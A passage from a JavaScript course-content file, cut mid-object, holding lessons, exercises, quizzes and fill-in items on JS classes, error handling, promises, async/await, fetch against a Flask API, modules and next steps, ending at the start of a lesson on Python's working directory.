      code: ['js', `class TimedTask extends Task {
  constructor(title, minutes) {
    super(title);
    this.minutes = minutes;
  }
}`] },
    { q: "How does `#balance` differ from Python's `_balance`?",
      a: "`_balance` is a convention — nothing stops you reading it. `#balance` is enforced by the language: accessing it from outside the class is a syntax error, not a runtime one, so it cannot even be attempted." }
  ],
  quiz: [
    { q: "What is `this` in a detached method call?",
      opts: ["The class", "The instance", "undefined", "The window"], correct: 2,
      why: "this is decided at the call site. Use an arrow field or bind()." },
    { q: "What must a subclass constructor do before touching `this`?",
      opts: ["Nothing", "Call super()", "Declare fields", "Return"], correct: 1,
      why: "The parent constructor creates the instance; before it runs there is no this." },
    { q: "What is the JavaScript equivalent of Python's @property?",
      opts: ["static", "get", "#", "constructor"], correct: 1,
      why: "get label() { } is read like a plain property: obj.label." },
    { q: "How private is `#balance`?",
      opts: ["A convention", "Enforced — outside access is a syntax error", "Hidden from devtools only", "Read-only"], correct: 1,
      why: "Stronger than Python's leading underscore, which is only a convention." }
  ],
  fill: [
    { prompt: "Initialise an instance.", lang: 'js',
      code: 'class Task {\n  ___(title) { this.title = title; }\n}', opts: ["__init__", "constructor", "init", "new"], correct: 1,
      why: "constructor is JavaScript's __init__, and `this` is implicit." },
    { prompt: "Keep `this` bound when the handler is detached.", lang: 'js',
      code: 'handle = ___ => { this.n++; };', opts: ["function()", "()", "self", "bind"], correct: 1,
      why: "An arrow class field captures this when the instance is created." },
    { prompt: "Call the parent constructor first.", lang: 'js',
      code: 'constructor(t, m) {\n  ___(t);\n  this.m = m;\n}', opts: ["parent", "super", "base", "Task"], correct: 1,
      why: "Using this before super() throws ReferenceError." }
  ]
};

LESSON_CONTENT_2["js:16"] = {
  blocks: [
    ['p', "Things fail: a network drops, JSON is malformed, a property is missing. The question is whether your code fails usefully or silently."],
    ['code', 'js', `try {
  const data = JSON.parse(text);
  render(data);
} catch (error) {
  console.error("Could not read that:", error.message);
  showMessage("That file is not valid JSON.");
} finally {
  hideSpinner();                 // runs either way
}`],
    ['h', "Throwing"],
    ['code', 'js', `function withdraw(balance, amount) {
  if (amount <= 0) throw new RangeError("Amount must be positive");
  if (amount > balance) throw new Error("Insufficient funds");
  return balance - amount;
}`],
    ['warn', "You can `throw` any value — `throw \"oops\"` is legal. Do not. Only an `Error` carries a stack trace, and every `catch` in the world expects `error.message` to exist."],
    ['h', "The built-in types"],
    ['tbl',
      ["Type", "Means"],
      [
        ["`TypeError`", "wrong type — the null-property error you keep seeing"],
        ["`ReferenceError`", "a name that does not exist"],
        ["`SyntaxError`", "unparseable — including bad JSON"],
        ["`RangeError`", "a number outside what is allowed"]
      ]
    ],
    ['h', "Your own error types"],
    ['code', 'js', `class ValidationError extends Error {
  constructor(field, message) {
    super(message);
    this.name = "ValidationError";
    this.field = field;
  }
}

try {
  throw new ValidationError("title", "Title is required");
} catch (error) {
  if (error instanceof ValidationError) highlight(error.field);
  else throw error;                     // not mine — pass it on
}`],
    ['note', "`else throw error` matters. Catching everything and handling only what you recognise silently swallows real bugs."],
    ['h', "The worst thing in any codebase"],
    ['code', 'js', `try { risky(); } catch (e) {}         // never do this`],
    ['p', "An empty catch turns a crash into wrong behaviour with no clue where it came from. If you genuinely expect and accept a failure, say so in a comment and log it."],
    ['h', "Errors in async code"],
    ['code', 'js', `// a callback's throw does NOT reach this try
try {
  setTimeout(() => { throw new Error("boom"); }, 10);
} catch (e) {
  // never runs — the callback runs later, on an empty stack
}

// with async/await it does
try {
  const data = await loadData();
} catch (e) {
  showMessage(e.message);
}`],
    ['p', "`try/catch` only covers the call stack it wraps. A callback that runs later has its own stack — which is one of the strongest arguments for `async/await` over callbacks."]
  ],
  ex: [
    { q: "Parse invalid JSON in a `try/catch`. What type is the error, and what is its message?",
      a: "A `SyntaxError`, with a message like `Unexpected token o in JSON at position 1`. Catching it lets you show something useful instead of a blank page." },
    { q: "Why throw `new Error(\"...\")` rather than a plain string?",
      a: "An `Error` carries a stack trace and a `message` property. `throw \"oops\"` gives `error.message === undefined` in every handler that catches it, and no trace of where it came from." },
    { q: "Write a `ValidationError` with a `field`, catch it, and re-throw anything else.",
      hint: "`instanceof`.",
      a: "Re-throwing what you do not recognise is what stops a catch block from hiding unrelated bugs.",
      code: ['js', `try { validate(form); }
catch (error) {
  if (error instanceof ValidationError) highlight(error.field);
  else throw error;
}`] },
    { q: "Explain concretely what `catch (e) {}` costs you.",
      a: "The program continues in a state you never designed for, and the evidence is destroyed — no message, no stack, no line number. A crash tells you where the problem is; a swallowed error means you debug a symptom three functions away." },
    { q: "Why does a `try` around `setTimeout(() => { throw ... })` not catch the throw?",
      a: "The callback runs later, from the event loop, on a fresh call stack. The `try` block finished long before. That is the structural problem `async/await` solves — awaited code shares your stack, so `catch` works normally." }
  ],
  quiz: [
    { q: "Why throw an Error rather than a string?",
      opts: ["Strings are illegal", "Only an Error carries a message and a stack trace", "It is faster", "catch requires it"], correct: 1,
      why: "Every handler expects error.message; a thrown string has none." },
    { q: "When does `finally` run?",
      opts: ["Only on success", "Only on failure", "Both, including after a return", "Never with a catch"], correct: 2,
      why: "Which is why it is the right place for cleanup like hiding a spinner." },
    { q: "Invalid JSON throws which type?",
      opts: ["TypeError", "SyntaxError", "RangeError", "ParseError"], correct: 1,
      why: "JSON.parse is a parser, so unparseable input is a SyntaxError." },
    { q: "Why does try/catch miss a throw inside a setTimeout callback?",
      opts: ["setTimeout suppresses errors", "The callback runs later, on its own stack", "You need catch(e, true)", "It does catch it"], correct: 1,
      why: "try/catch only covers the stack it wraps — a strong argument for async/await." }
  ],
  fill: [
    { prompt: "Signal a problem properly.", lang: 'js',
      code: 'throw new ___("Amount must be positive");', opts: ["String", "Error", "Exception", "Throw"], correct: 1,
      why: "Error carries a message and a stack trace." },
    { prompt: "Clean up whatever happened.", lang: 'js',
      code: 'try { }\ncatch (e) { }\n___ { hideSpinner(); }', opts: ["else", "always", "finally", "end"], correct: 2,
      why: "finally runs on both paths, including after a return." },
    { prompt: "Handle only your own error type.", lang: 'js',
      code: 'if (error ___ ValidationError) { }', opts: ["typeof", "instanceof", "is", "==="], correct: 1,
      why: "instanceof tests the prototype chain, so subclasses match too." }
  ]
};

LESSON_CONTENT_2["js:17"] = {
  blocks: [
    ['p', "JavaScript runs your code on **one thread**, yet a page stays responsive while waiting for a network request. Understanding how is the last big conceptual step in this track."],
    ['h', "The event loop"],
    ['code', 'js', `console.log("first");
setTimeout(() => console.log("third"), 0);
console.log("second");

// first, second, third — even with a 0ms delay`],
    ['p', "Your code runs to completion, and only then does the engine take the next item from the queue. `setTimeout(fn, 0)` means “as soon as the current work is finished”, not “now”. Slow work therefore blocks everything — including clicks and rendering."],
    ['lab', 'js', `console.log("1 sync");
setTimeout(() => console.log("4 timeout"), 0);
Promise.resolve().then(() => console.log("3 microtask"));
console.log("2 sync");`],
    ['p', "Promises jump the queue: microtasks all run before the next timer. That is why the promise line prints third and the timeout fourth."],
    ['h', "Callbacks, and why they nest"],
    ['code', 'js', `loadUser(id, (user) => {
  loadPosts(user, (posts) => {
    loadComments(posts[0], (comments) => {
      render(comments);              // and each level needs its own error path
    });
  });
});`],
    ['h', "A promise"],
    ['code', 'js', `const promise = new Promise((resolve, reject) => {
  setTimeout(() => resolve("done"), 500);
  // reject(new Error("failed")) on the unhappy path
});

promise
  .then(value => console.log(value))
  .catch(error => console.error(error))
  .finally(() => hideSpinner());`],
    ['p', "A promise is an object representing a value that is not ready yet. It is **pending**, then either **fulfilled** or **rejected** — and once settled it never changes."],
    ['h', "Chaining flattens the nesting"],
    ['code', 'js', `loadUser(id)
  .then(user => loadPosts(user))      // returning a promise chains it
  .then(posts => loadComments(posts[0]))
  .then(render)
  .catch(handleAnyFailure);           // one handler for the whole chain`],
    ['warn', "Returning the inner promise is what makes this work. `.then(user => { loadPosts(user); })` — with braces and no `return` — resolves to `undefined` and the next step gets nothing. A silent, very common bug."],
    ['h', "Running several at once"],
    ['code', 'js', `Promise.all([a, b, c]);          // all values, or rejects on the first failure
Promise.allSettled([a, b, c]);   // never rejects; status per promise
Promise.race([a, timeout(5000)]); // whichever settles first
Promise.any([a, b]);             // the first success`]
  ],
  ex: [
    { q: "Run the ordering lab and explain why the four lines print in that order.",
      a: "Both `console.log` calls are synchronous, so they run first. The promise callback is a microtask, which runs as soon as the synchronous work finishes. The timeout is a macrotask, taken only after all microtasks are done." },
    { q: "Why does `setTimeout(fn, 0)` not run immediately?",
      a: "It queues `fn` to run after the current call stack empties. With one thread, nothing else can run until your code returns — which is also why a long loop freezes the page." },
    { q: "Turn a nested callback chain three deep into a promise chain.",
      hint: "Return each promise.",
      a: "One `.catch` now covers all three steps, instead of an error path per level.",
      code: ['js', `loadUser(id)
  .then(user => loadPosts(user))
  .then(posts => loadComments(posts[0]))
  .then(render)
  .catch(showError);`] },
    { q: "`.then(user => { loadPosts(user); })` breaks the chain. Why?",
      a: "With braces the arrow has a body, and without `return` it resolves to `undefined` — so the next `.then` receives `undefined` rather than the posts. Either add `return`, or drop the braces for an implicit return." },
    { q: "You need three independent requests. Compare `Promise.all` and `Promise.allSettled`.",
      a: "`all` rejects as soon as any one fails, discarding the successful results — right when you need every piece. `allSettled` always resolves with a status per promise, so you can render what worked and report what did not." }
  ],
  quiz: [
    { q: "What does `setTimeout(fn, 0)` mean?",
      opts: ["Run now", "Run once the current call stack is empty", "Run never", "Run in a thread"], correct: 1,
      why: "One thread: nothing else runs until your synchronous code returns." },
    { q: "Which runs first — a resolved promise callback or a 0ms timeout?",
      opts: ["The timeout", "The promise (microtasks drain first)", "Whichever was written first", "Undefined order"], correct: 1,
      why: "All microtasks run before the next macrotask." },
    { q: "How many states can a promise end in?",
      opts: ["One", "Two — fulfilled or rejected, and it never changes after", "Three", "Any number"], correct: 1,
      why: "Pending is the starting state; settling is permanent." },
    { q: "Why does `.then(u => { loadPosts(u); })` break the chain?",
      opts: ["Braces are illegal", "Without return it resolves to undefined", "loadPosts is async", "then takes no arrow"], correct: 1,
      why: "The next .then receives undefined instead of the promise's value." }
  ],
  fill: [
    { prompt: "Handle a failure anywhere in the chain.", lang: 'js',
      code: 'loadUser(id).then(render).___(showError);', opts: ["else", "catch", "fail", "error"], correct: 1,
      why: "One catch covers every step before it." },
    { prompt: "Wait for several independent requests.", lang: 'js',
      code: 'const [a, b] = await Promise.___([one, two]);', opts: ["all", "race", "any", "each"], correct: 0,
      why: "all resolves with every value, or rejects on the first failure." },
    { prompt: "Keep the chain flowing.", lang: 'js',
      code: '.then(user => { ___ loadPosts(user); })', opts: ["await", "return", "yield", "then"], correct: 1,
      why: "Without it the arrow resolves to undefined." }
  ]
};

LESSON_CONTENT_2["js:18"] = {
  blocks: [
    ['p', "`async`/`await` is syntax over promises. The behaviour is identical; the code reads top to bottom instead of as a chain."],
    ['code', 'js', `// promises
function load(id) {
  return loadUser(id)
    .then(user => loadPosts(user))
    .then(posts => render(posts))
    .catch(showError);
}

// the same thing
async function load(id) {
  try {
    const user = await loadUser(id);
    const posts = await loadPosts(user);
    render(posts);
  } catch (error) {
    showError(error);
  }
}`],
    ['h', "Two rules"],
    ['ul', [
      "An `async` function **always returns a promise**, whatever you return inside it.",
      "`await` may only appear inside an `async` function (or at the top level of a module)."
    ]],
    ['code', 'js', `async function two() { return 2; }
two();                    // Promise { 2 } — not 2
await two();              // 2`],
    ['warn', "Forgetting `await` is the most common mistake here, and it fails quietly: you get a `Promise` object instead of the value. `console.log(user.name)` then prints `undefined`, and `if (user)` is always true because a promise is truthy."],
    ['h', "Errors work normally again"],
    ['code', 'js', `try {
  const data = await loadData();
} catch (error) {
  // reaches here for a rejection AND for a throw inside loadData
}`],
    ['p', "This is the real win. Awaited code shares your call stack, so `try/catch` behaves the way it does everywhere else — unlike a callback, whose throw you could never catch."],
    ['h', "Sequential versus parallel"],
    ['code', 'js', `// 3 seconds — each waits for the one before
const a = await loadA();     // 1s
const b = await loadB();     // 1s
const c = await loadC();     // 1s

// 1 second — all three start immediately
const [a, b, c] = await Promise.all([loadA(), loadB(), loadC()]);`],
    ['warn', "Await in a loop is the classic performance bug. If the items do not depend on each other, start them all and await together:"],
    ['code', 'js', `// slow: one at a time
for (const id of ids) results.push(await load(id));

// fast: all at once
const results = await Promise.all(ids.map(id => load(id)));`],
    ['h', "Await only what you must"],
    ['code', 'js', `const userPromise = loadUser();      // starts now
const postsPromise = loadPosts();   // starts now, in parallel

const user = await userPromise;     // now wait
const posts = await postsPromise;`],
    ['p', "Calling an async function starts the work; `await` only decides when you pause for the result."]
  ],
  ex: [
    { q: "Convert a three-step promise chain into `async`/`await` with a `try/catch`.",
      a: "The variables are ordinary locals now, so step three can use step one's value without threading it through every `.then`." },
    { q: "What does `async function two() { return 2 }` actually return?",
      a: "A promise resolving to 2 — never the bare number. `two() + 1` gives `\"[object Promise]1\"`, which is a confusing way to discover the rule." },
    { q: "You forgot an `await`. Describe how that fails.",
      a: "Silently. You get a `Promise` object, so property access yields `undefined` and truthiness checks always pass. Nothing throws, and the symptom appears wherever the value is finally used — often far from the missing keyword." },
    { q: "Rewrite an awaiting loop over 10 independent ids to run in parallel. What is the speed difference?",
      hint: "`Promise.all` plus `map`.",
      a: "Sequential takes the sum of all ten; parallel takes the slowest single one. For 10 requests at ~200ms each that is roughly 2 seconds versus 200ms.",
      code: ['js', `const results = await Promise.all(ids.map(id => load(id)));`] },
    { q: "When is awaiting one after another the *correct* choice?",
      a: "When a later call needs an earlier result — you cannot load a user's posts before you have the user. Sequential is right for genuine dependencies and wrong for independent work." }
  ],
  quiz: [
    { q: "What does an async function return?",
      opts: ["Whatever you return", "Always a promise", "undefined", "A generator"], correct: 1,
      why: "`return 2` from an async function gives Promise { 2 }." },
    { q: "How does forgetting `await` fail?",
      opts: ["Throws immediately", "Silently — you get a Promise, so properties are undefined", "Hangs", "Returns null"], correct: 1,
      why: "A promise is truthy, so guards pass and the symptom appears far from the cause." },
    { q: "Three independent 1-second requests, awaited one by one, take…",
      opts: ["1 second", "3 seconds", "It depends", "0 seconds"], correct: 1,
      why: "Promise.all starts them together and takes about 1 second." },
    { q: "Why does try/catch work with await but not with a callback?",
      opts: ["await is synchronous", "Awaited code shares your call stack; a callback runs later on its own", "Callbacks cannot throw", "It does work"], correct: 1,
      why: "This is the strongest practical argument for async/await." }
  ],
  fill: [
    { prompt: "Allow await inside this function.", lang: 'js',
      code: '___ function load() { const u = await get(); }', opts: ["def", "async", "await", "promise"], correct: 1,
      why: "await is only valid inside an async function or at a module's top level." },
    { prompt: "Run independent requests together.", lang: 'js',
      code: 'const [a, b] = await Promise.___([loadA(), loadB()]);', opts: ["all", "race", "any", "chain"], correct: 0,
      why: "Awaiting them one by one adds the times together." },
    { prompt: "Catch a rejection.", lang: 'js',
      code: '___ {\n  const d = await load();\n} catch (e) { }', opts: ["if", "try", "do", "with"], correct: 1,
      why: "Awaited code shares your stack, so ordinary try/catch applies." }
  ]
};

LESSON_CONTENT_2["js:19"] = {
  blocks: [
    ['p', "This is the lesson both tracks have been building toward: your JavaScript calling the Flask API you wrote, and updating the page without a reload."],
    ['h', "The Flask side"],
    ['code', 'python', `@app.route("/api/tasks")
def api_tasks():
    return jsonify(tasks)

@app.route("/api/tasks", methods=["POST"])
def api_create():
    data = request.get_json(silent=True) or {}
    title = (data.get("title") or "").strip()
    if not title:
        return jsonify(error="title is required"), 400
    task = {"id": next_id(), "title": title, "done": False}
    tasks.append(task)
    return jsonify(task), 201`],
    ['h', "Reading"],
    ['code', 'js', `async function loadTasks() {
  const response = await fetch("/api/tasks");
  if (!response.ok) throw new Error("HTTP " + response.status);
  return response.json();
}`],
    ['warn', "**`fetch` does not reject on a 404 or a 500.** It rejects only when the request could not be made at all — no network, DNS failure, CORS refusal. A 500 is a *successful* HTTP exchange that happens to carry an error, so you must check `response.ok` yourself. Skipping that check is the number one `fetch` bug."],
    ['h', "Writing"],
    ['code', 'js', `async function createTask(title) {
  const response = await fetch("/api/tasks", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ title }),
  });

  const data = await response.json();
  if (!response.ok) throw new Error(data.error ?? "Request failed");
  return data;
}`],
    ['p', "Three things must line up, and Flask needs all of them: the method, the `Content-Type` header, and a `body` that is a **string** — `JSON.stringify` is not optional."],
    ['h', "The whole loop"],
    ['code', 'js', `const form = document.querySelector("#task-form");
const list = document.querySelector("#task-list");
const status = document.querySelector("#status");

async function refresh() {
  status.textContent = "Loading…";
  try {
    const tasks = await loadTasks();
    list.replaceChildren(...tasks.map(taskElement));
    status.textContent = "";
  } catch (error) {
    status.textContent = "Could not load tasks: " + error.message;
  }
}

form.addEventListener("submit", async (event) => {
  event.preventDefault();
  const title = form.querySelector("[name=title]").value.trim();
  if (!title) return;

  const button = form.querySelector("button");
  button.disabled = true;
  try {
    await createTask(title);
    form.reset();
    await refresh();
  } catch (error) {
    status.textContent = error.message;
  } finally {
    button.disabled = false;
  }
});

refresh();`],
    ['note', "Note the three states every real request has: **loading**, **success**, **failure**. Handling only the success case is what makes an interface feel broken the first time the network hiccups."],
    ['h', "CORS, briefly"],
    ['p', "Fetching from the same origin that served the page needs nothing at all. A different origin — a different port counts — is blocked by the browser unless the server sends permission headers. Serving your JavaScript from Flask's `static/` folder keeps you same-origin, which is why none of this has bitten you yet."]
  ],
  ex: [
    { q: "Add `/api/hobbies` in Flask and fetch it, rendering the list into the page.",
      a: "Note there is no reload — the page rewrites itself from data.",
      code: ['js', `const res = await fetch("/api/hobbies");
const hobbies = await res.json();
list.replaceChildren(...hobbies.map(h => {
  const li = document.createElement("li");
  li.textContent = h;
  return li;
}));`] },
    { q: "Fetch a URL that returns 404. Does the promise reject? What does that mean for your code?",
      a: "No — it resolves with `response.ok === false` and `status === 404`. A `.catch` alone will not notice, so you must check `response.ok` and throw yourself, or the failure passes silently into your render code." },
    { q: "POST a new task. Name the three things that must be right for Flask to see the body.",
      a: "`method: \"POST\"`, the `Content-Type: application/json` header, and `body: JSON.stringify(...)`. Miss the header and `request.get_json()` returns `None`; pass an object instead of a string and the body becomes `\"[object Object]\"`." },
    { q: "Add loading and error states to the fetch above.",
      a: "Three states, always: show progress, show the result, show a readable failure. `finally` is the right place to re-enable a button, because it runs on both paths." },
    { q: "Why has CORS never troubled you in this project?",
      a: "The JavaScript is served from Flask's `static/` folder, so the page and the API share an origin and no cross-origin rules apply. Open the same HTML from a `file://` URL, or serve it on another port, and every fetch to the API would be blocked." }
  ],
  quiz: [
    { q: "Does `fetch` reject on a 500 response?",
      opts: ["Yes", "No — check response.ok yourself", "Only on 404", "Only with await"], correct: 1,
      why: "It rejects only when the request could not be made at all. A 500 is a successful exchange carrying an error." },
    { q: "What must `body` be for a JSON POST?",
      opts: ["A plain object", "A JSON string from JSON.stringify", "FormData", "An array"], correct: 1,
      why: "Passing an object gives the literal text \"[object Object]\"." },
    { q: "Flask's `get_json()` returns None from your fetch. Most likely cause?",
      opts: ["Wrong URL", "Missing Content-Type: application/json header", "Body too large", "Wrong port"], correct: 1,
      why: "Flask will not guess the body format." },
    { q: "Why does same-origin matter?",
      opts: ["It is faster", "A different origin is blocked unless the server sends CORS headers", "It enables cookies only", "It compresses"], correct: 1,
      why: "Serving your JS from Flask's static folder keeps everything same-origin." }
  ],
  fill: [
    { prompt: "Check whether the response was a success.", lang: 'js',
      code: 'if (!response.___) throw new Error("failed");', opts: ["success", "ok", "valid", "status"], correct: 1,
      why: "ok is true for 200-299. fetch does not reject on 4xx or 5xx." },
    { prompt: "Send JSON that Flask can read.", lang: 'js',
      code: 'body: JSON.___({ title })', opts: ["parse", "stringify", "encode", "format"], correct: 1,
      why: "The body must be a string; parse goes the other way." },
    { prompt: "Tell the server what you are sending.", lang: 'js',
      code: 'headers: { "___": "application/json" }', opts: ["Accept", "Content-Type", "Body-Type", "Format"], correct: 1,
      why: "Without it request.get_json() returns None." }
  ]
};

LESSON_CONTENT_2["js:20"] = {
  blocks: [
    ['p', "One file stops being enough. Modules let you split code across files with explicit imports instead of hoping the global scope works out."],
    ['h', "Exporting and importing"],
    ['code', 'js', `// static/js/tasks.js
export function loadTasks() { }
export const API = "/api/tasks";

export default class TaskList { }        // at most one per file`],
    ['code', 'js', `// static/js/app.js
import TaskList, { loadTasks, API } from "./tasks.js";
import * as tasks from "./tasks.js";
import { loadTasks as load } from "./tasks.js";`],
    ['tbl',
      ["", "Named", "Default"],
      [
        ["Per file", "as many as you like", "at most one"],
        ["Export", "`export function f()`", "`export default f`"],
        ["Import", "`import { f } from ...`", "`import anyName from ...`"],
        ["Renaming", "`{ f as g }`", "just pick a name"]
      ]
    ],
    ['note', "Prefer named exports. The name is then fixed, so searching the codebase finds every use — with a default, each file may call it something different."],
    ['h', "Loading them"],
    ['code', 'html', `<script type="module" src="{{ url_for('static', filename='js/app.js') }}"><\/script>`],
    ['ul', [
      "`type=\"module\"` is required — without it `import` is a syntax error.",
      "Modules are **deferred automatically**, so they run after the HTML is parsed. No `defer` needed.",
      "Each module has its own scope: a top-level `const` is not global.",
      "Strict mode is always on.",
      "A module is evaluated **once**, however many files import it."
    ]],
    ['warn', "Modules are blocked over `file://` — the browser refuses the cross-origin request for the imported file. Opening the HTML by double-clicking gives a CORS error in the console. You must serve it over http, which Flask is already doing for you."],
    ['h', "The path is a real path"],
    ['code', 'js', `import { loadTasks } from "./tasks.js";     // the .js is required
import { loadTasks } from "tasks.js";       // fails — needs ./ or a full URL`],
    ['p', "Unlike Node, the browser does not guess extensions or search folders. Write the path exactly."],
    ['h', "Circular imports"],
    ['code', 'js', `// a.js
import { b } from "./b.js";
export const a = "A" + b;      // b may still be undefined here`],
    ['p', "Two modules importing each other is legal but fragile — one of them sees a half-initialised value. It is nearly always a sign that a third module should hold the shared thing."],
    ['h', "Loading only when needed"],
    ['code', 'js', `button.addEventListener("click", async () => {
  const { renderChart } = await import("./chart.js");   // fetched on demand
  renderChart(data);
});`]
  ],
  ex: [
    { q: "Split a helper into its own file and import it. What must the `<script>` tag say?",
      a: "`type=\"module\"`. Without it, `import` is a syntax error — and the message points at the import line rather than the missing attribute, which is misleading.",
      code: ['html', `<script type="module" src="/static/js/app.js"><\/script>`] },
    { q: "Give one advantage of named exports over a default export.",
      a: "The name is fixed at the export, so every import uses the same word and a project-wide search finds them all. A default export can be renamed per file, so `import x from` and `import y from` may be the same thing." },
    { q: "You open the HTML by double-clicking and get a CORS error on the import. Why?",
      a: "Module imports are fetched as cross-origin requests, and `file://` has no origin the browser will accept. Serve the page over http — Flask already does — and it works." },
    { q: "Why is `import { f } from \"tasks.js\"` an error?",
      hint: "Compare with Node.",
      a: "Browser module specifiers must be a real path or URL: `./tasks.js`, `/static/js/tasks.js`, or `https://...`. A bare name is reserved for import maps, and the extension is never inferred." },
    { q: "How do modules change the top-level scope compared with a classic script?",
      a: "A classic script's top-level `var` and function declarations land on the global object, so files can collide silently. A module has its own scope — nothing leaks unless exported — and strict mode is always on." }
  ],
  quiz: [
    { q: "What must the script tag include for `import` to work?",
      opts: ["defer", "async", "type=\"module\"", "nothing"], correct: 2,
      why: "Without it, import is a syntax error. Modules are also deferred automatically." },
    { q: "How many default exports may one file have?",
      opts: ["Any number", "At most one", "Exactly one", "None"], correct: 1,
      why: "Named exports are unlimited, and generally preferable." },
    { q: "Why do modules fail over file://?",
      opts: ["They need a build step", "Imports are cross-origin requests the browser blocks", "file:// is deprecated", "They need HTTPS"], correct: 1,
      why: "Serve over http — which Flask already does." },
    { q: "A module imported by three files is evaluated…",
      opts: ["Three times", "Once", "Once per import statement", "Never"], correct: 1,
      why: "Modules are singletons, which is why a module-level object is shared state." }
  ],
  fill: [
    { prompt: "Enable imports in the browser.", lang: 'html',
      code: '<script ___="module" src="/static/js/app.js"><\\/script>', opts: ["rel", "type", "lang", "as"], correct: 1,
      why: "Without it import is a syntax error." },
    { prompt: "Import two named exports.", lang: 'js',
      code: 'import ___ from "./tasks.js";', opts: ["{ loadTasks, API }", "[loadTasks, API]", "(loadTasks, API)", "loadTasks, API"], correct: 0,
      why: "Braces for named imports; no braces for a default export." },
    { prompt: "Write a specifier the browser accepts.", lang: 'js',
      code: 'import { f } from "___tasks.js";', opts: ["", "./", "~/", "@/"], correct: 1,
      why: "A relative or absolute path, extension included — bare names are not resolved." }
  ]
};

LESSON_CONTENT_2["js:21"] = {
  blocks: [
    ['p', "You can now write a full page: select elements, respond to events, call your Flask API and render the result. This lesson is a map of what is beyond that, and — more usefully — what you can safely ignore for now."],
    ['h', "What you actually know"],
    ['ul', [
      "Values, types, and the coercion rules that trip people up.",
      "Functions as values, closures, and why `let` beats `var`.",
      "Arrays and objects, with destructuring and spread.",
      "The DOM: selecting, changing, and event delegation.",
      "The event loop, promises, and `async`/`await`.",
      "`fetch` against your own API, with real loading and error states."
    ]],
    ['p', "That list is most of what day-to-day front-end work consists of."],
    ['h', "npm and package.json"],
    ['code', 'shell', `npm init -y
npm install some-library
npm run dev`],
    ['p', "`package.json` lists your dependencies and named scripts. `node_modules/` is where they land — never committed, always regenerable from `package-lock.json`. It is `requirements.txt` and a virtualenv, with the folder in your project instead of hidden away."],
    ['h', "What a bundler is for"],
    ['p', "Vite, esbuild and their relatives combine many modules into few files, rewrite modern syntax for older browsers, and reload the page as you save. **You do not need one yet** — native modules served by Flask work fine. Reach for a bundler when the number of files or the size of dependencies makes hand-management annoying."],
    ['h', "When a framework earns its keep"],
    ['tbl',
      ["Situation", "Reach for"],
      [
        ["A few interactive pieces on server-rendered pages", "plain JavaScript — what you have"],
        ["State appearing in many places at once", "a framework"],
        ["Complex client-side routing", "a framework"],
        ["A team needing shared conventions", "a framework"]
      ]
    ],
    ['p', "React, Vue and Svelte all solve one problem: keeping the DOM in sync with data as it changes. If your page mostly renders once and handles a few clicks, they cost more than they give."],
    ['h', "TypeScript, in a paragraph"],
    ['code', 'js', `function greet(name: string, times: number = 1): string {
  return (\`hi \${name} \`).repeat(times);
}`],
    ['p', "JavaScript plus type annotations, checked before you run and erased at build time. It catches the `undefined` bugs this track kept warning you about. Worth adding once a project is large enough that you cannot hold it all in your head."],
    ['h', "Reading MDN well"],
    ['p', "Search `mdn` plus the method name. Look at **Syntax**, then **Examples**, then **Browser compatibility** — in that order. MDN is a reference written by people who know the specification; the answers there are correct in a way that random blog posts are not."],
    ['h', "What to build next"],
    ['ul', [
      "Finish the todo app: add editing, filtering and a delete confirmation, all through `fetch`.",
      "Add search-as-you-type against a Flask endpoint, debounced so you do not fire on every keystroke.",
      "Persist a draft in `localStorage` so a refresh does not lose it.",
      "Then rebuild the same thing with a framework — the comparison teaches more than either alone."
    ]]
  ],
  ex: [
    { q: "List three things you can now do in the browser that you could not before this track.",
      a: "Answers will vary — respond to events with delegation, call an API and render its data without a reload, and reason about asynchronous code well enough to handle loading and failure states." },
    { q: "What is `node_modules/` and why is it never committed?",
      a: "The installed dependencies. It is enormous, platform-specific, and fully reproducible from `package.json` plus `package-lock.json` — the same reasoning as a Python virtualenv." },
    { q: "Give a specific case where a framework is not worth it.",
      a: "A Flask app that renders pages server-side with Jinja and needs a handful of interactive widgets. The DOM is already correct on arrival; a framework would add a build step, a dependency tree and a rendering model to solve a problem you do not have." },
    { q: "Which bug from this track would TypeScript have caught?",
      a: "`response.json()` returning a shape you assumed but never checked; forgetting `await` and treating a `Promise` as its value; calling a method on a `querySelector` result that can be `null`. All three are type errors that surface at runtime in plain JavaScript." },
    { q: "Add debounced search-as-you-type against a Flask endpoint. Why debounce?",
      hint: "How many requests does one word produce?",
      a: "Without it, six characters means six requests, and slow responses can arrive out of order so an older result overwrites a newer one. Debouncing waits until typing pauses.",
      code: ['js', `let timer;
input.addEventListener("input", () => {
  clearTimeout(timer);
  timer = setTimeout(async () => {
    const res = await fetch("/api/search?q=" + encodeURIComponent(input.value));
    render(await res.json());
  }, 250);
});`] }
  ],
  quiz: [
    { q: "What is package.json to a Python developer?",
      opts: ["A bundler config", "requirements.txt plus named scripts", "A test runner", "A linter"], correct: 1,
      why: "node_modules/ is the installed set — regenerable, never committed." },
    { q: "When is a bundler genuinely needed?",
      opts: ["Always", "When file count or dependency size makes hand-management painful", "For any import", "For CSS"], correct: 1,
      why: "Native modules served by Flask are fine for a small project." },
    { q: "What problem do React and Vue solve?",
      opts: ["Making requests", "Keeping the DOM in sync with changing data", "Routing on the server", "Styling"], correct: 1,
      why: "If your page renders once and handles a few clicks, they cost more than they give." },
    { q: "Why debounce search-as-you-type?",
      opts: ["It looks smoother", "One request per keystroke, and slow responses can arrive out of order", "fetch requires it", "To avoid CORS"], correct: 1,
      why: "Wait for a pause in typing before firing." }
  ],
  fill: [
    { prompt: "Wait until typing pauses before searching.", lang: 'js',
      code: 'clearTimeout(timer);\ntimer = ___(search, 250);', opts: ["setInterval", "setTimeout", "requestAnimationFrame", "queueMicrotask"], correct: 1,
      why: "Each keystroke cancels the pending call and schedules a new one." },
    { prompt: "Make a value safe inside a query string.", lang: 'js',
      code: '"/api/search?q=" + ___(input.value)', opts: ["escape", "encodeURIComponent", "JSON.stringify", "String"], correct: 1,
      why: "It escapes &, = and spaces so the parameter survives intact." },
    { prompt: "Keep a draft across a refresh.", lang: 'js',
      code: '___.setItem("draft", input.value);', opts: ["sessionStorage", "localStorage", "cookies", "cache"], correct: 1,
      why: "localStorage persists until cleared; sessionStorage dies with the tab." }
  ]
};

/* Completes the os track. */
LESSON_CONTENT_2["os:9"] = {
  blocks: [
    ['p', "Every relative path in a Python program is resolved against one hidden value: the current working directory. It is not where your script lives — it is where the terminal was standing when the process started."],
    ['h', "Seeing it"],
    ['code', 'python', `import os

os.getcwd()                                     # where relative paths resolve
os.path.dirname(os.path.abspath(__file__))      # where this file lives`],
    ['code', 'shell', `PS learn> python hello.py
